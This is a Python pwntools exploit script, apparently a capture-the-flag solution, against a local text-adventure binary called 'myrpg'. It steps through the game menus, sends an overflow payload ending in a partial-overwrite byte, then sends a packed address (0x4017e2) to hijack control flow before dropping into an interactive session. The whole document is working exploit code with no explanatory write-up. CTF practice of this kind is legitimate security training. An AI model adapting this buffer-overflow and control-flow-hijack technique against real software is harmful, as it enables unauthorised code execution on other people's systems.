#!/usr/bin/env python3

from pwn import *

# Load the binary
binary = "./myrpg"
elf = ELF(binary)

# Connect to the process
p = process(binary)
context.arch = "amd64"

# Reach the "shout" functionality
p.sendlineafter(b"# Choose >", b"1")  # New game
p.sendlineafter(b"# Choose >", b"1")  # Talk
payload = b"aaaaaaaaaaaaaaaaaaaaaaab" + b"\xc8"  # aaaaaaaaaaaaaaaaaaaaaaabÈ
p.sendlineafter(b"# >", payload)  # Talk to the beast 

p.sendlineafter(b"# Choose >", b"2")  # Follow left path
p.sendlineafter(b"# Choose >", b"2")  # Shout at the beast
payload = b"aaaaaaaaaaaaaaaaaaaaaaa"
p.sendlineafter(b"# >", payload)  # Send the payload

print(p.recvuntil(b"# The beast accelerates towards you...").decode())

p.sendlineafter(b"# Choose >", b"4")  # Exit
p.sendlineafter(b"# Choose >", b"1")  # Talk

payload = p64(0x4017e2, endianness="little")
p.sendlineafter(b"# >", payload)  # Send the payload

p.sendlineafter(b"# Choose >", b"2")  # Follow left path
p.sendlineafter(b"# Choose >", b"2")  # Shout at the beast
p.sendlineafter(b"# >", payload)  # Send the payload

p.sendlineafter(b"# Choose >", b"4")  # Go back
p.sendlineafter(b"# Choose >", b"4")  # Exit

p.interactive()
